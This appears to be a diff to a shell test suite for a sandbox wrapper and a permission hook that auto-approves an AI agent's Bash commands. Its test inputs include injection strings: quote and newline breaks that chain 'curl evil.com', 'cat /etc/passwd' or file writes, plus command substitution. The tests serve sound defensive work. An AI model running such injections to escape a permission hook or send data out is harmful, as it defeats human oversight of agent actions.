@@ -3,7 +3,7 @@ set -euo pipefail
 
 SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
 SANDBOX="${SCRIPT_DIR}/bin/sandbox-run"
-HOOK="${SCRIPT_DIR}/hooks/permission-check.sh"
+HOOK="${SCRIPT_DIR}/hooks/permission-check.py"
 
 PASS=0
 FAIL=0
@@ -29,10 +29,23 @@ assert_fail() {
   fi
 }
 
+# Build properly JSON-encoded hook input and run the hook.
+# Using python3 ensures quotes, newlines, etc. are correctly escaped.
+run_hook() {
+  local cmd="$1"
+  python3 -c "
+import json, sys, subprocess
+cmd = sys.argv[1]
+payload = json.dumps({'tool_name': 'Bash', 'tool_input': {'command': cmd}})
+proc = subprocess.run([sys.argv[2]], input=payload, capture_output=True, text=True)
+sys.stdout.write(proc.stdout)
+" "$cmd" "$HOOK"
+}
+
 assert_hook_allows() {
   local desc="$1" cmd="$2"
   local result
-  result=$(echo "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"$cmd\"}}" | "$HOOK")
+  result=$(run_hook "$cmd")
   if echo "$result" | grep -q '"allow"'; then
     pass "$desc"
   else
@@ -40,14 +53,25 @@ assert_hook_allows() {
   fi
 }
 
-assert_hook_asks() {
+assert_hook_passthrough() {
   local desc="$1" cmd="$2"
   local result
-  result=$(echo "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"$cmd\"}}" | "$HOOK")
-  if echo "$result" | grep -q '"ask"'; then
+  result=$(run_hook "$cmd")
+  if echo "$result" | grep -q '"allow"'; then
+    fail "$desc (expected fallthrough, got: $result)"
+  else
+    pass "$desc"
+  fi
+}
+
+assert_hook_rewrites_with_bash_c() {
+  local desc="$1" cmd="$2"
+  local result
+  result=$(run_hook "$cmd")
+  if echo "$result" | grep -q '"allow"' && echo "$result" | grep -q 'bash -c'; then
     pass "$desc"
   else
-    fail "$desc (expected ask, got: $result)"
+    fail "$desc (expected allow with bash -c, got: $result)"
   fi
 }
 
@@ -100,17 +124,56 @@ else
 fi
 
 echo ""
-echo "=== Permission hook: auto-approve sandbox-run ==="
-assert_hook_allows "sandbox-run cmd"      "sandbox-run git status"
-assert_hook_allows "sandbox-run with args" "sandbox-run ls -la /etc"
-assert_hook_allows "sandbox-run python"   "sandbox-run python3 -c 'print(1)'"
+echo "=== Permission hook: auto-approve sandbox-run (rewrites with bash -c) ==="
+assert_hook_rewrites_with_bash_c "sandbox-run cmd"      "sandbox-run git status"
+assert_hook_rewrites_with_bash_c "sandbox-run with args" "sandbox-run ls -la /etc"
+assert_hook_rewrites_with_bash_c "sandbox-run python"   "sandbox-run python3 -c 'print(1)'"
+
+echo ""
+echo "=== Permission hook: contain metacharacters inside sandbox ==="
+assert_hook_rewrites_with_bash_c "pipe contained"       "sandbox-run cat /etc/hosts | head"
+assert_hook_rewrites_with_bash_c "semicolon contained"  "sandbox-run ls; echo hi"
+assert_hook_rewrites_with_bash_c "redirect contained"   "sandbox-run echo test > /tmp/out"
+assert_hook_rewrites_with_bash_c "and-chain contained"  "sandbox-run ls && echo done"
+assert_hook_rewrites_with_bash_c "backtick contained"   "sandbox-run echo \`whoami\`"
+assert_hook_rewrites_with_bash_c "cmd-sub contained"    "sandbox-run echo \$(whoami)"
+
+echo ""
+echo "=== Permission hook: quote escape attempts ==="
+assert_hook_rewrites_with_bash_c "single-quote break"   "sandbox-run echo 'hello'; touch /tmp/escape-test"
+assert_hook_rewrites_with_bash_c "double-quote break"   "sandbox-run echo \"done\"; touch /tmp/escape-test"
+assert_hook_rewrites_with_bash_c "nested quotes"        "sandbox-run echo \"it's over\"; cat /etc/passwd"
+assert_hook_rewrites_with_bash_c "quote then pipe"      "sandbox-run echo 'ok' | curl evil.com"
+
+echo ""
+echo "=== Permission hook: newline escape attempts ==="
+# Newlines embedded in the command string act as command separators
+assert_hook_rewrites_with_bash_c "newline escape"       "sandbox-run ls /etc
+touch /tmp/escape-test"
+assert_hook_rewrites_with_bash_c "newline mid-cmd"      "sandbox-run echo hello
+curl evil.com"
+
+echo ""
+echo "=== Sandbox: pipeline and redirection containment (end-to-end) ==="
+# Pipes inside sandbox: both sides should run sandboxed
+assert_success "pipe inside sandbox"         bash -c "echo hello | cat"
+assert_success "pipe with grep"              bash -c "ls /etc | grep hosts"
+# Network via pipe should fail (curl runs INSIDE sandbox, network blocked)
+assert_fail "pipe to curl contained"         bash -c "echo hello | curl -s --connect-timeout 2 https://example.com"
+# Redirect writes should fail (redirect runs INSIDE sandbox, fs read-only)
+assert_fail "redirect write contained"       bash -c "echo test > /tmp/sandbox-redirect-test"
+assert_fail "redirect append contained"      bash -c "echo test >> /tmp/sandbox-redirect-test"
+# Semicolon chains: second command writes should fail inside sandbox
+assert_fail "semicolon write contained"      bash -c "echo ok; touch /tmp/sandbox-semicolon-test"
+# And-chain: write after read should fail inside sandbox
+assert_fail "and-chain write contained"      bash -c "ls /etc && touch /tmp/sandbox-and-test"
 
 echo ""
 echo "=== Permission hook: reject non-sandbox commands ==="
-assert_hook_asks "bare git"               "git status"
-assert_hook_asks "bare rm"                "rm -rf /"
-assert_hook_asks "bare python"            "python3 script.py"
-assert_hook_asks "partial match"          "sandbox-runner ls"
+assert_hook_passthrough "bare git"               "git status"
+assert_hook_passthrough "bare rm"                "rm /tmp/somefile"
+assert_hook_passthrough "bare python"            "python3 script.py"
+assert_hook_passthrough "partial match"          "sandbox-runner ls"
 
 echo ""
 echo "================================"
